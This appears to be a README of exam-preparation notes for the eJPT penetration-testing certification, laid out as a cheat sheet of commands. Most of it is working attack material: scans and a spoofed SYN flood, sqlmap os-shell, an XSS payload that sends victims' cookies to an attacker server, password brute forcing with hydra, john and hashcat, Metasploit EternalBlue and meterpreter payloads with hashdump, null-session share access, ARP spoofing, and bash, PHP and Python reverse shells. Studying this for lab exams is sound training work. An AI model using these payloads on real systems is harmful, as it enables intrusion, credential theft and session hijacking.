# eJPT
some eLearnSecurity eJPT exam preparation materials

### nmap + fping
hosts discovery fping:
```bash
fping -a -g 10.10.10.0/24 2> fping.txt
```

hosts discovery nmap:
```bash
nmap -sn 10.10.10.0/24 > hosts.txt
nmap -sn -T4 10.10.30.0/24 -oG - | awk '/Up$/{print $2}'
```

open ports scan (save to file):
```bash
nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
```

UDP port scan:
```bash
nmap -sU -sV 10.10.10.0/24
```

nmap vuln scan example:
```bash
nmap --script vuln --script-args=unsafe=1 -iL hosts.txt
```

nmap SYN flood example:
```bash
watch -n 10 "nmap -e wlan0 -Pn -T5 -S 192.168.0.253 192.168.0.251"
```

### masscan

masscan open only examples:
```bash
sudo masscan -p 21,22,80,8080,445,9200 --rate 64000 --wait 0 --open-only -oG masscan.gnmap 10.0.0.0/24
sudo masscan -iL hosts.list -p0-65535 --rate 64000 --open-only
```

### httprint

httprint banner grabling:
```bash
httprint -P0 -s /usr/share/httprint/signatures.txt -h 10.10.10.15
```

### route

add a route in kali/parrot:
```bash
ip route add 192.168.88.0/24 via 10.10.34.1
```

routing table:
```bash
netstat -rn
Kernel IP routing table
Destination      Gateway        Genmask         Flags   MSS Window  irtt Iface
...
192.168.88.0     10.10.34.1     255.255.255.0   UG        0 0          0 tap0
...
```

### subdomains
discovery subdomain of a target by sublist3r:
```bash
sublist3r -d company.com
```

## wireshark
filter by ip
```bash
ip.add == 10.10.10.9
```

filter by dest ip
```bash
ip.dest == 10.10.10.15
```

filter by source ip
```bash
ip.src == 10.10.16.33
```

filter by tcp port
```bash
tcp.port == 25
```

filter by ip addr and port
```bash
ip.addr == 10.10.14.22 and tcp.port == 8080
```

filter SYN flag
```bash
tcp.flags.syn == 1 and tcp.flags.ack ==0
```

broadcast filter
```bash
eth.dst == ff:ff:ff:ff:ff:ff
```

### web app enum (gobuster)
```bash
nc -v 10.10.10.14 80
HEAD / HTTP/1.0

openssl s_client -connect 10.10.10.14:443

dirb http://10.10.10.123/
dirb https://10.10.10.5 /usr/share/dirb/wordlists/vulns/apache.txt
dirb https://192.168.16.33 /usr/share/dirb/wordlists/common.txt

gobuster dir -u http://10.10.10.160 -w /usr/share/wordlists/dirb/common.txt -t 16
```

### web app enum (ffuf)

directory discovery:
```bash
ffuf -w wordlist.txt -u http://example.com/FUZZ
```

file discovery:
```bash
ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
```

output of responses with status code:
```bash
ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
```

the -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:
```bash
ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
```

number of threads:
```bash
ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
```

### sqlmap

determine the databases:
```bash
sqlmap -u http://10.10.10.15/?id=4 --dbs
```

determine the tables:
```bash
sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
```

dump a table's data:
```bash
sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
```

try to get os-shell:
```bash
sqlmap -u http://10.10.10.15/?id=4 --os-shell
```

### xss

check example:
```javascript
<script>alert("hack :)")</script>
```

#### hijack cookie through xss
there are four components as follows:
- attacker client pc
- attacker logging server
- vulnerable server
- victim client pc


1) attacker: first finds a vulnerable server and its breach point.

2) attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):
```javascript
<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
```

3) attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:
```bash
nc -vv -k -l -p 80
```

4) attacker: when victim client pc browses the vulnerable server, check the output of the command above.

5) attacker: after obtaining the victim's cookie, utilize a firefox's add-on called Cookie Quick Manager to change to the victim's cookie in an effort to hijack the victim's privilege.


### bruteforce (hydra, john, hashcat)
wordlist generation
```bash
cewl example.com -m 3 -w wordlist.txt
```

hydra http basic auth brute
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
```

hydra brute http digest
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
```

hydra brute http post form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
```

hydra brute http authenticated post form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
```

hydra brute
```bash
hydra -f -v -V -L users.txt -P rockyou-15.txt -s 2223 -f ssh://10.10.10.17
hydra -v -V -l admin -P rockyou-10.txt ssh://10.10.10.18
```

combine passwd with shadow file for john the ripper:
```bash
unshadow passwd shadow > crack.hash
```

john the ripper bruteforce:
```bash
john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
```

hashcat:
```bash
hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
```

### wpscan
```bash
wpscan --url http://10.10.10.14 --enumerate u
wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN
wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt
wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt
```

### mysql
scan:
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
```

examples:
```bash
mysql -h 10.10.10.23 -P 13306 -u root -p -e "show databases;"
mysql -h 10.10.10.23 -P 13306 -u root -p -e "use mydb;show tables;"
mysql -h 10.10.10.23 -P 13306 -u root -p -e "use mydb;select * from users;"
```

### msfconsole
search exploit
```bash
msf> search cve:2011 port:135 platform:windows target:XP
```

basic
```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set rhosts 10.10.10.110
set rports 1433
set username admin
set password 12345
set verbose true
run
```
### msfconsole examples
msssql enum
```bash
use auxiliary/scanner/mssql/mssql_enum
set username admin
set password 12345
set rhosts 10.10.10.177
set rport 1433
run
```

mssql payload
```bash
use exploit/windows/mssql/mssql_payload
set rhosts 10.10.10.177
set rport 1433
set srvport 53
set username admin
set password qwerty
set payload windows/x64/meterpreter_reverse_tcp
```

ssh login enum (brute)
```bash
use auxiliary/scanner/ssh/ssh_login
show options
set rhosts 10.10.10.133
set user_file /usr/share/ncrack/minimal.usr
set pass_file /usr/share/ncrack/minimal.usr
set verbose true
run
```

eternal blue example:
```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set payload windows/x64/meterpreter/reverse_tcp
```

### meterpreter
```bash
meterpreter>run autoroute -s 172.16.50.0/24
background

sessions -l
sessions -i 1

sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac

download x /root/
upload x C:\\Windows
shell

use post/windows/gather/hashdump
```

### windows shares with null sessions

enumeration with kali/parrot tools:
```
nmblookup -A 10.16.64.223
smbclient -L //10.16.64.223 -N share
smbclient //10.16.64.223/share -N mount

enum4linux -a 10.10.10.13
```

enumeration with nmap:
```bash
ll /usr/share/nmap/scripts/ | grep smb-enum-
-rw-r--r-- 1 root root  4846 Jan  9  2019 smb-enum-domains.nse
-rw-r--r-- 1 root root  5931 Jan  9  2019 smb-enum-groups.nse
-rw-r--r-- 1 root root  8045 Jan  9  2019 smb-enum-processes.nse
-rw-r--r-- 1 root root 27262 Jan  9  2019 smb-enum-services.nse
-rw-r--r-- 1 root root 12057 Jan  9  2019 smb-enum-sessions.nse
-rw-r--r-- 1 root root  6923 Jan  9  2019 smb-enum-shares.nse
-rw-r--r-- 1 root root 12531 Jan  9  2019 smb-enum-users.nse

nmap --script=smb-enum-users 192.168.1.10
```

#### null sessions
1) Use "enum4linux -n" to make sure if "<20>" exists:
```bash
enum4linux -n 192.168.1.10
```

2) If "<20>" exists, it means Null Session could be exploited. Utilize the following command to get more details:
```bash
enum4linux 192.168.1.10
```

3) If confirmed that Null Session exists, you can remotely list all share of the target:
```bash
smbclient -L WORKGROUP -I 192.168.1.10 -N -U ""
```

4) You also can connect the remote server by applying the following command:
```bash
smbclient \\\\192.168.1.10\\c$ -N -U ""
```

5) Download those files stored on the share drive:
```bash
smb: \> get Congratulations.txt
```

### ARP spoofing
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.13.37.100 -r 10.13.37.101
```

### reverse shell
bash
```bash
bash -i >& /dev/tcp/10.0.14.22/4444 0>&1
```

php one line (bash)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.14.10/4444 0>&1'"); ?>
```

python
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

## programming examples
port scanner examples:

[python simple tcp scan example](https://github.com/cocomelonc/ejpt/blob/master/scanner.py)

[golang simple tcp scan example](https://github.com/cocomelonc/ejpt/blob/master/scanner.go)
